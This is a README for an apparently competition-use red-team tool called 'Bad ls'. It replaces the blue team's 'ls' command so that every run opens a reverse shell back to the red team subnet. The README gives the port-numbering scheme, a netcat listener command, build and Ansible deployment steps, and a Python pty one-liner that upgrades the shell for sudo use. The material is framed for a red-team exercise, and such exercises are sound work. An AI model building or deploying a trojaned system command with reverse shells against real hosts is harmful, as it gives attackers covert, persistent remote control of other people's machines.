# CDT 2025 Red Team tool
## Bad ls
Red team tool that will give the entire 10.0.20.0/24 red team subnet a reverse shell if the red team box is listening on the correct port

Reverse shells will be initiated on every blue team execution of the "ls" command

The port number the reverse shell will connect to will be
```py
(10000,20000,30000 depending on blue team number + last octet of target ip address)
```
So, for example, we want to connect to 10.0.3.5, the port number will be `30005`

## Starting listener
Port number is subject to change
```bash
nc -nvlp 30005
```

## Building and deploying

Note: build executable on debian bookworm instance

Install libpython3.11
```bash
apt install libpython3.11
```

In the venv, install requirements
```bash
pip install -r requirements.txt
```

Build python script into linux binary
```bash
./convert_to_linux_binary.sh
```

Configure `ansible/inventory.ini` to match target(s), then deploy
```bash
ansible-playbook deploy_tools.yml
```

## Upgrading reverse shell to fully interactive tty
Execute this after recieving a netcat connection
Useful for being able to use sudo, etc. 
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

# TODO
Make "all-in-one" deploy script that will build and then deploy to box
Create tmux listeners for every possible IP in scope

> Author: Daniel Wolosiuk

Oct 17, 2025

